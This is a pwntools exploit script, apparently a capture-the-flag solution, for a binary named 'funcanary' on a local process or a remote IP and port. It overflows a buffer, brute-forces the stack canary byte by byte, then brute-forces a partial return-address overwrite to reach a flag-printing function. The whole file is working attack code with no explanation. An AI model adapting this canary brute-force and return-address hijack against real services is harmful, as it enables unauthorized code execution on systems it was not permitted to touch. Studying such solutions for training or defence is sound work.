from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./funcanary')

if local:
    p = process('./funcanary')
    libc = elf.libc

else:
    p = remote('123.56.238.150',23391)
p.recvuntil(b'welcome\n')
canary = b'\x00'
for k in range(7):
    for i in range(256):
        print("the " + str(k) + ": " + chr(i))
        p.send(b'a'*0x68 + canary + i.to_bytes(1, "little"))
        a = p.recvuntil(b"welcome\n")
        if b"fun" in a:
                canary += i.to_bytes(1, "little")
                print(canary)
                break
sign=0
for i in range(0xe):
    back=0x122E+i*0x1000
    payload = b'A' * 0x68 + canary + b'A' * 8 + p16(back)
    p.send(payload)
    a = p.recvuntil(b"welcome\n")
    if b'flag' in a:
        sign=1
        break
if sign==0 :
    for i in range(0xe):
        back=0x1228+i*0x1000
        payload = b'A' * 0x68 + canary + b'A' * 8 + p16(back)
        p.send(payload)
        a = p.recvuntil(b"welcome\n")
        if b'flag' in a:
            break

# gdb.attach(sh)
p.interactive()